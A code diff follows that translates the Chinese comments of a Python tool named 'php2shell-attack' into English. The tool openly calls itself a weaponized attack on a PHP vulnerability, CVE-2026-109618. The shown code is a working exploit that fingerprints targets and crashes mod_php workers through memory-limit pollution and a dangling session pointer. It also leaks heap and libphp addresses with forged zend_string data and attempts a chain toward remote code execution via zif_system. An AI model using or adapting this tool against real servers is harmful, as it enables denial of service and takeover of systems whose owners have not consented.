@@ -1,16 +1,16 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""php2shell-attack — CVE-2026-109618 实战化攻击工具
+"""php2shell-attack — CVE-2026-109618 weaponized attack tool
 
-能力分层（由弱到强，逐层依赖）：
-  probe   指纹/前置条件判定（版本、upload_progress、OOM 阈值、fatal 形态）
-  crash   武器化 DoS：OOM 污染 + 悬垂 zval 解引用，确定性打崩 mod_php worker
-  sweep   Stage-1 堆泄漏布局扫描（不同 stage1_n 伪造 zend_string）
-  chain   完整链尝试：泄漏 chunk base -> 泄漏 libphp base -> 伪造 HashTable -> zif_system
-  verify  对同一目标复测（用于验证补丁是否生效）
+Capability layers (weakest to strongest, each depends on the previous):
+  probe   fingerprint / precondition check (version, upload_progress, OOM threshold, fatal shape)
+  crash   weaponized DoS: OOM pollution + dangling zval dereference, deterministically kills the mod_php worker
+  sweep   Stage-1 heap-leak layout sweep (forged zend_string with different stage1_n)
+  chain   full chain attempt: leak chunk base -> leak libphp base -> forge HashTable -> zif_system
+  verify  re-test the same target (to check whether a patch took effect)
 
-设计原则：任何"成功"都必须是可观测证据（响应/连接行为/命令回显/证明文件），
-不做假设式判定；失败要打印失败层级，便于区分"没打中"与"打了但不成立"。
+Design principle: any "success" must be observable evidence (response / connection behavior / command echo / proof file),
+no assumption-based verdicts; failures must print the failure layer so "did not hit" and "hit but not confirmed" stay distinguishable.
 """
 from __future__ import annotations
 
@@ -29,7 +29,7 @@ BOUNDARY_PRIME = b"S" * 17
 BOUNDARY_KILL = b"BNDRY12345"
 
 
-# ---------------------------------------------------------------- HTTP 原语
+# ---------------------------------------------------------------- HTTP primitives
 class Target:
     def __init__(self, url: str, timeout: float = 30.0):
         u = urlsplit(url)
@@ -62,7 +62,7 @@ class Target:
         try:
             s.sendall("\r\n".join(hdr).encode() + body)
         except OSError:
-            pass  # 崩溃型目标常常写一半就被杀
+            pass  # crash-prone targets often die halfway through the write
         data = bytearray()
         try:
             while len(data) < read_cap:
@@ -85,7 +85,7 @@ class Target:
 
     @staticmethod
     def _read_response(s: socket.socket, cap: int) -> bytes:
-        """读取一个完整响应：支持 Content-Length 与 chunked，未知时读到 EOF/超时。"""
+        """Read one complete response: supports Content-Length and chunked; when unknown, read to EOF/timeout."""
         buf = bytearray()
         try:
             while b"\r\n\r\n" not in buf and len(buf) < cap:
@@ -110,7 +110,7 @@ class Target:
                         break
                     out += chunk
             elif chunked:
-                # 读到终止块 "0\r\n\r\n" 为止
+                # read until the terminating block "0\r\n\r\n"
                 while b"\r\n0\r\n" not in out[-512:] and len(out) < cap:
                     chunk = s.recv(65536)
                     if not chunk:
@@ -130,10 +130,10 @@ class Target:
 
     def post_keepalive_pair(self, first: tuple[bytes, bytes], second: tuple[bytes, bytes],
                             cap: int = 1 << 20, timeout: float = 60.0) -> tuple[bytes, bytes]:
-        """在同一 TCP 连接（同一 prefork 子进程）上依次发送两个请求。
+        """Send two requests back to back on the same TCP connection (same prefork child process).
 
-        这是 109618 稳定命中的关键：OOM 污染的 session 全局状态属于 worker 进程，
-        若 A/B 落到不同 worker，B 看不到污染，攻击退化为普通请求。
+        This is the key to reliably hitting 109618: the OOM-polluted session global state belongs to the worker process,
+        if A/B land on different workers, B cannot see the pollution and the attack degrades to an ordinary request.
         """
         s = self.connect()
         s.settimeout(timeout)
@@ -195,11 +195,11 @@ def parse_cookie(resp: bytes) -> bytes:
 
 
 def chunk_base_from_cookie(cookie: bytes) -> int:
-    """从 Set-Cookie 提取伪造 zend_string 携带的堆指针。
+    """Extract the heap pointer carried by the forged zend_string from Set-Cookie.
 
-    严格校验，避免把普通 32 位十六进制 PHPSESSID 误判为泄漏：
-      - 值不能是 32 字符的纯 hex（那是正常 session id）
-      - 前 8 字节按小端解析后必须页对齐且落在 0x7f....(用户态 anon mmap) 区间
+    Validate strictly so an ordinary 32-character hex PHPSESSID is not mistaken for a leak:
+      - the value must not be 32 pure hex characters (that is a normal session id)
+      - the first 8 bytes, decoded little-endian, must be page-aligned and fall in the 0x7f.... (user-space anon mmap) range
     """
     m = cookie.split(b"=", 1)
     if len(m) != 2:
@@ -217,10 +217,10 @@ def chunk_base_from_cookie(cookie: bytes) -> int:
     return base
 
 
-# ---------------------------------------------------------------- 攻击面
+# ---------------------------------------------------------------- Attack surface
 @dataclass
 class Weapon:
-    """请求形状常量。不同 PHP 版本的堆布局不同，这些值是"待调参数"而非真理。"""
+    """Request-shape constants. Heap layout differs per PHP version; these are tuning candidates rather than truth."""
     huge_mb: int = 12
     prime_parts: int = 1001
     prime_part_size: int = 3000
@@ -242,7 +242,7 @@ class Attack:
         if self.verbose:
             print(msg, file=sys.stderr)
 
-    # --- 请求形状 ---
+    # --- request shape ---
     def _big_field(self) -> dict:
         return {"name": "big", "data": b"B" * (self.w.huge_mb * 1024 * 1024)}
 
@@ -250,8 +250,8 @@ class Attack:
         return {"name": "f", "filename": "a.txt", "data": b"A" * 64}
 
     def prime_body(self, count: int | None = None, size: int | None = None) -> tuple[bytes, bytes]:
-        """构造污染请求。Stage-1 需要 1001 个 1 字节 part（与 PoC 对齐），
-        3000 字节的形状会让后续泄漏请求在解引用时直接崩掉。"""
+        """Build the pollution request. Stage-1 needs 1001 1-byte parts (matching the PoC);
+        the 3000-byte shape makes the follow-up leak request crash outright at dereference time."""
         count = self.w.prime_parts if count is None else count
         size = self.w.prime_part_size if size is None else size
         parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * size} for i in range(count)]
@@ -271,7 +271,7 @@ class Attack:
         return build_multipart(parts, BOUNDARY_KILL), BOUNDARY_KILL
 
     def prime(self) -> dict:
-        """请求 A：把 memory_limit 撑爆，让 longjmp 跳过 session 状态的清理。"""
+        """Request A: blow past memory_limit so longjmp skips cleanup of the session state."""
         parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * self.w.prime_part_size}
                  for i in range(self.w.prime_parts)]
         parts += [
@@ -288,7 +288,7 @@ class Attack:
                 "code": self._code(resp), "resp_head": resp[:160].decode("latin-1", "replace")}
 
     def kill(self) -> dict:
-        """请求 B：session 初始化时解引用 A 留下的悬垂 zval。"""
+        """Request B: dereference the dangling zval left by A during session init."""
         parts = [
             {"name": "PHPSESSID", "data": SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
@@ -308,7 +308,7 @@ class Attack:
         except Exception:  # noqa: BLE001
             return 0
 
-    # --- 检测 ---
+    # --- detection ---
     def probe(self) -> dict:
         code, resp = self.t.get()
         version = ""
@@ -324,7 +324,7 @@ class Attack:
         for line in resp.split(b"\r\n"):
             if line.lower().startswith(b"server:"):
                 out["server"] = line.split(b":", 1)[1].strip().decode("latin-1")
-        # 小 POST：看是否正常返回 Set-Cookie（说明有 session 消费点）
+        # small POST: check whether Set-Cookie comes back normally (a session sink exists)
         body = build_multipart([
             {"name": "PHPSESSID", "data": SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
@@ -333,7 +333,7 @@ class Attack:
         r = self.t.post(body, BOUNDARY_KILL, read_cap=65536)
         out["set_cookie_on_small_post"] = bool(parse_cookie(r))
         out["small_post_code"] = self._code(r)
-        # OOM 阈值二分：1..16MB 的单字段，观察响应是否出现 fatal/OOM 特征
+        # OOM threshold bisection: single field from 1..16MB, watch for fatal/OOM markers in the response
         lo, hi = 1, max(2, self.w.huge_mb)
         out["oom_threshold_mb"] = self._bisect_oom(lo, hi)
         out["progress_callback_reachable"] = out["set_cookie_on_small_post"]
@@ -362,9 +362,9 @@ class Attack:
         return lo
 
     def _control_pair_ok(self) -> bool:
-        """控制组：同一连接上两个无害小 POST，第二个是否有人响应。
+        """Control group: two harmless small POSTs on one connection; does the second get a response?
 
-        用于排除"服务端直接关 keep-alive 造成空响应"被误判成 worker 崩溃。
+        Used to rule out a server that closes keep-alive (empty response) being misread as a worker crash.
         """
         harmless = build_multipart([
             {"name": "PHPSESSID", "data": SID},
@@ -376,12 +376,12 @@ class Attack:
         return len(r2) > 0
 
     def crash_test(self, rounds: int = 2) -> dict:
-        """确定性打崩 worker：同一 keep-alive 连接上 A(污染) -> B(解引用)。
+        """Deterministically kill the worker: A(pollution) -> B(dereference) on one keep-alive connection.
 
-        判定要求三条同时成立，避免误报：
-          1) 控制组同一连接的第二个请求有响应（keep-alive 可用）
-          2) 攻击组第二个请求无响应/500（进程在解引用时死亡）
-          3) 随后普通 GET 仍可用（master 已重启 worker，说明是子进程崩溃而非服务挂掉）
+        The verdict requires all three conditions, to avoid false positives:
+          1) the control group's second request on the same connection gets a response (keep-alive works)
+          2) the attack group's second request gets no response/500 (the process dies at dereference)
+          3) a plain GET still works afterwards (the master respawned the worker, so the child crashed, not the service)
         """
         control_ok = self._control_pair_ok()
         evidence = []
@@ -415,10 +415,10 @@ class Attack:
                 "verdict": verdict, "evidence": evidence}
 
     def leak_sweep(self, ns: list[int], same_conn: bool = True) -> dict:
-        """Stage-1 扫描：伪造 zend_string 长度，让 Set-Cookie 带出堆地址。
+        """Stage-1 sweep: forge the zend_string length so Set-Cookie carries out a heap address.
 
-        same_conn=True 时把污染请求与泄漏请求放在同一 keep-alive 连接上，
-        保证落在同一 prefork 子进程（跨进程攻击会退化为普通请求）。
+        With same_conn=True the pollution and leak requests share one keep-alive connection,
+        guaranteeing the same prefork child process (cross-process attacks degrade to ordinary requests).
         """
         results = []
         pb, pbnd = self.prime_body(count=1001, size=1)
@@ -433,7 +433,7 @@ class Attack:
                 parts.append({"name": str(1000 + i),
                               "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
             forge = bytearray(b"A" * 79)
-            struct.pack_into("<Q", forge, 0x10, 0x1000)  # 伪造 zend_string->len
+            struct.pack_into("<Q", forge, 0x10, 0x1000)  # forge zend_string->len
             forge[0x18] = ord("L")
             parts.append({"name": "1999", "data": bytes(forge)})
             lb = build_multipart(parts, b"B" * 10)
@@ -452,14 +452,14 @@ class Attack:
                 "verdict": "heap_leaked" if hit else "no_leak"}
 
     def chain(self, ns: list[int]) -> dict:
-        """完整链：leak -> libphp base -> 伪造 HashTable -> zif_system。"""
+        """Full chain: leak -> libphp base -> forged HashTable -> zif_system."""
         leak = self.leak_sweep(ns)
         if not leak["leaks"]:
             return {"stage_reached": "prime+crash", "rce": False, "leak": leak,
-                    "reason": "Stage-1 未取得堆基址，后续 Stage-2/3 缺少地基；"
-                              "此配置下只得到稳定崩溃原语（DoS）。"}
+                    "reason": "Stage-1 did not obtain the heap base, so Stage-2/3 have no foundation;"
+                              "this configuration only yields a reliable crash primitive (DoS)."}
         base = int(leak["results"][-1]["chunk_base"], 16)
-        # Stage-2：用 56 字节 HashTable page 泄漏 libphp 基址（形状沿用 PoC）
+        # Stage-2: leak the libphp base with a 56-byte HashTable page (shape follows the PoC)
         self.prime()
         parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
         parts += [{"name": "PHPSESSID", "data": b"\x00"},
@@ -484,8 +484,8 @@ class Attack:
         return {"stage_reached": "stage2_attempt", "rce": False, "chunk_base": hex(base),
                 "stage2_cookie": cookie[:80].decode("latin-1", "replace"),
                 "stage2_low12": hex(low), "expected_low12": hex(self.w.dtor & 0xFFF),
-                "reason": "Stage-2 libphp 基址未对齐到 zval_ptr_dtor 页偏移" if low != (self.w.dtor & 0xFFF) else
-                          "基址疑似命中，但 Stage-3 伪造 payload 仍需按该版本布局调参"}
+                "reason": "Stage-2 libphp base not aligned to the zval_ptr_dtor page offset" if low != (self.w.dtor & 0xFFF) else
+                          "base likely hit, but the Stage-3 forged payload still needs tuning for this version's layout"}
 
 
 # ---------------------------------------------------------------- CLI
